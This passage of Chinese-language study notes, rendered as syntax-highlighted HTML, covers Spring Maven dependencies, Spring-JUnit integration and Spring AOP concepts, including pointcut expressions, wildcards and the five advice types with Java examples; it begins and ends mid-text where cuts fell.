punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.1.46<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.10.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>德鲁伊坐标        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>druid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.1.16<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--下面两个是单独需要的--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>spring整合jdbc坐标        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-jdbc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.10.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>spring整合mybatis坐标        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis-spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="24-spring整合junit"><a class="markdownIt-Anchor" href="#24-spring整合junit">#</a> 24、Spring 整合 Junit</h1><h1 id="25-aop简介"><a class="markdownIt-Anchor" href="#25-aop简介">#</a> 25、AOP 简介</h1><ul><li>AOP（Aspect Oriented Programming）面向切面编程，一种编程范式，指导开发者如何组织程序结构<ul><li>OOP 面向对象编程</li></ul></li><li>作用：在不惊动原始设计的基础上为其进行功能增强</li><li>Spring 理念：无侵入式 \ 无侵入式编程</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220902162615221.png" alt="image-20220902162615221"></p><ul><li>连接点（JoinPoint）：程序执行过程中的任意位置，粒度为执行方法、抛出异常、设置变量等<ul><li>在 SpringAOP 中理解为方法的执行</li></ul></li><li>切入点（Pointcut）：匹配连接点的式子<ul><li>在 SpringAOP 中，一个切入点可以只描述一个具体方法，也可以匹配多个方法<ul><li>一个具体方法：com.itheima. dao 包下的 BookDao 接口中的无形参无返回值的 save 方法</li><li>匹配多个方法：所有的 save 方法，所有的 get 开头的方法，所有以 Dao 结尾的接口中的任意方法，所有带有一个参数的方法</li></ul></li></ul></li><li>通知（Advice )︰在切入点处执行的操作，也就是共性功能<ul><li>在 SpringAOP 中，功能最终以方法的形式呈现</li></ul></li><li>通知类∶定义通知的类通知类：定义通知的类</li><li>切面 (Aspect)︰描述通知与切入点的对应关系切面 (方面)：描述通知与切入点的对应关系</li></ul><h1 id="26-aop入门案例"><a class="markdownIt-Anchor" href="#26-aop入门案例">#</a> 26、AOP 入门案例</h1><p>案例设定：测定接口执行效率</p><p>简化设定：在接口执行前输出当前系统时间</p><p>开发模式：XML or 注解</p><p>思路分析</p><ol><li>导入坐标</li><li>制作连接点方法（原始操作，Dao 接口与实现类）</li><li>制作共性功能（通知与通知类）</li><li>定义切入点</li><li>绑定切入点与通知面的关系（切面）</li></ol><ul><li>导包：context 包导入后 AOP 的包自动导入</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220902163915679.png" alt="image-20220902163915679"></p><ul><li>导入 aspect 包</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.aspectj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>aspectjweaver<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>定义 dao 接口与实现类</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao update ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>定义通知类，制作通知</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAdvice</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>定义切入点</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAdvice</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//描述切入点</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(void com.itheima.dao.BookDao.update())"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">pt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>绑定切入点与通知关系，并指定通知添加到原始连接点的具体执行位置</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAdvice</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//描述切入点</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(void com.itheima.dao.BookDao.update())"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">pt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">//绑定切入点</span>    <span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span><span class="token string">"pt()"</span><span class="token punctuation">)</span>    <span class="token comment">//定义好通知</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><ul><li>定义通知类受 Spring 容器管理，并定义当前类为切面类</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//告诉程序加载这个类</span><span class="token annotation punctuation">@Component</span><span class="token comment">//告诉程序这个类是做AOP的</span><span class="token annotation punctuation">@Aspect</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAdvice</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//描述切入点</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(void com.itheima.dao.BookDao.update())"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">pt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">//绑定切入点</span>    <span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span><span class="token string">"pt()"</span><span class="token punctuation">)</span>    <span class="token comment">//定义好通知</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>开启 Spring 对 AOP 注解驱动支持</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima"</span><span class="token punctuation">)</span><span class="token comment">//告诉程序要用注解开</span><span class="token annotation punctuation">@EnableAspectJAutoProxy</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="27-aop工作流程"><a class="markdownIt-Anchor" href="#27-aop工作流程">#</a> 27、AOP 工作流程</h1><h2 id="271-aop工作流程"><a class="markdownIt-Anchor" href="#271-aop工作流程">#</a> 27.1 AOP 工作流程</h2><ol><li>Spring 容器启动</li><li>读取所有切面配置中的切入点</li><li>初始化 bean，判定 bean 对应的类中的方法是否匹配到任意切入点<ul><li>匹配失败，创建对象</li><li>匹配成功，创建原始对象（目标对象）的代理对象</li></ul></li><li>获取 bean 执行方法<ul><li>获取 bean，调用方法并执行，完成操作</li><li>获取的 bean 是代理对象时，根据代理对象的运行模式运行原始方法与增强的内容，完成操作</li></ul></li></ol><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220905091017704.png" alt="image-20220905091017704"></p><ul><li>目标对象（Target）：原始功能去掉共性功能对应的类产生的对象，这种对象是无法直接完成最终工作的</li><li>代理（Proxy）：目标对象无法直接完成工作，需要对其进行功能回填，通过原始对象的代理对象实现</li></ul><h1 id="28-aop切入点表达式"><a class="markdownIt-Anchor" href="#28-aop切入点表达式">#</a> 28、AOP 切入点表达式</h1><ul><li>切入点：要进行增强的方法</li><li>切入点表达式：要进行增强的方法的描述方式</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220905091246270.png" alt="image-20220905091246270"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220905091259144.png" alt="image-20220905091259144"></p><ul><li>切入点表达式标准格式：动作关键字（访问修饰符 返回值 包名。类 / 接口名。方法名（参数）异常名</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220905091359174.png" alt="image-20220905091359174"></p><h2 id="281-通配符"><a class="markdownIt-Anchor" href="#281-通配符">#</a> 28.1 通配符</h2><ul><li><p>可以使用通配符描述切入点，快速描述</p><ul><li><p>*：单个独立的任意符号，可以独立出现，也可以作为前缀或者后缀的匹配符出现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">execution <span class="token punctuation">(</span><span class="token keyword">public</span> <span class="token operator">*</span> com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>*<span class="token punctuation">.</span>UserService<span class="token punctuation">.</span>find<span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>匹配 con.itheima 包下的任意包中的 UserService 类或接口中所有 find 开头的带有一个参数的方法</p></li><li><p>…：多个连续的任意符号，可以独立出现，常用于简化包名与参数的书写</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">execution <span class="token punctuation">(</span><span class="token keyword">public</span> <span class="token class-name">User</span> com<span class="token punctuation">.</span><span class="token punctuation">.</span>UserService<span class="token punctuation">.</span><span class="token function">findById</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>匹配 com 包下的任意包中的 UserService 类或接口中所有名称为 findById 的方法</p></li><li><p>+：专用于匹配子型</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">execution <span class="token punctuation">(</span><span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token punctuation">.</span>*<span class="token class-name">Service</span><span class="token operator">+</span><span class="token punctuation">.</span>*<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul><h2 id="282-书写技巧"><a class="markdownIt-Anchor" href="#282-书写技巧">#</a> 28.2 书写技巧</h2><ul><li>所有代码按照标准规范开发，否则以下技巧全部失效</li><li>描述切入点<mark>通常描述接口</mark>，而不描述实现类</li><li>访问控制修饰符针对接口开发均采用 public 描述（<mark>可省略访问控制修饰符描述</mark>）</li><li>返回值类型对于增删改类使用精准类型加速匹配，对于查询类使用 * 通配快速描述</li><li><mark>包名</mark>书写<mark>尽量不使用… 匹配</mark>，效率过低，常用 * 做单个包描述匹配，或精准匹配</li><li><mark>接口名</mark> / 类名书写名称与模块相关的<mark>采用 * 匹配</mark>，例如 UserService 书写成 * Service，绑定业务层接口名</li><li><mark>方法名</mark>书写以<mark>动词</mark>进行<mark>精准匹配</mark>，名词采用 * 匹配，例如 getById 书写成 getBy*,selectAll 书写成 selectAll</li><li>参数规则较为复杂，根据业务方法灵活调整</li><li>通常<mark>不使用异常</mark>作为<mark>匹配</mark>规则</li></ul><h1 id="29-aop通知类型"><a class="markdownIt-Anchor" href="#29-aop通知类型">#</a> 29、AOP 通知类型</h1><ul><li>AOP 通知描述了抽取的共性功能，根据共性功能抽取的位置不同，最终运行代码时要将其加入到合理的位置</li><li>AOP 通知共分为 5 钟类型：<ul><li>前置通知</li><li>后置通知</li><li><mark><strong>环绕通知（重点）</strong></mark></li><li>返回后通知（了解）</li><li>抛出异常后通知（了解）</li></ul></li></ul><pre class="line-numbers language-none"><code class="language-none">@Before@After@Around -- 方法要加ProceedingJoinPoint proceedingJoinPoint参数， Object ret &#x3D; proceedingJoinPoint.proceed();表示运行原方法@AfterReturning 方法正常运行后@AfterThrowing方法出异常后<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>aop</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">ProceedingJoinPoint</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Aspect</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAdvice</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(void com.itheima.dao.BookDao.update())"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">pt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(int com.itheima.dao.BookDao.select())"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">pt2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//    @Before("pt()")</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//    @After("pt()")</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//    @Around("pt()")</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">around</span><span class="token punctuation">(</span><span class="token class-name">ProceedingJoinPoint</span> pjp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//表示对原始方法的调用</span>        <span class="token class-name">Object</span> proceed <span class="token operator">=</span> pjp<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> proceed<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span><span class="token string">"pt2()"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">aroundSelect</span><span class="token punctuation">(</span><span class="token class-name">ProceedingJoinPoint</span> proceedingJoinPoint<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//</span>        <span class="token class-name">Integer</span> ret <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span> proceedingJoinPoint<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ret <span class="token operator">+</span> <span class="token number">566</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@AfterReturning</span><span class="token punctuation">(</span><span class="token string">"pt()"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterReturning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"afterReturning advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@AfterThrowing</span><span class="token punctuation">(</span><span class="token string">"pt2()"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterThrowing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"afterThrowing advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>@Around 注意事项<ol><li>环绕通知必须依赖形参 ProceedingJoinPoint 才能实现对原始方法的调用，进而实现原始方法调用前后同时添加通知</li><li>通知中如果未使用 ProceedingJoinPoint 对原始方法进行调用将跳过原始方法的执行</li><li>对原始方法的调用可以不接收返回值，通知方法设置成 void 即可，如果接收返回值，必须设定为 Object 类型</li><li>原始方法的返回值如果是 void 类型，通知方法的返回值类型可以设置成 void, 也可以设置成 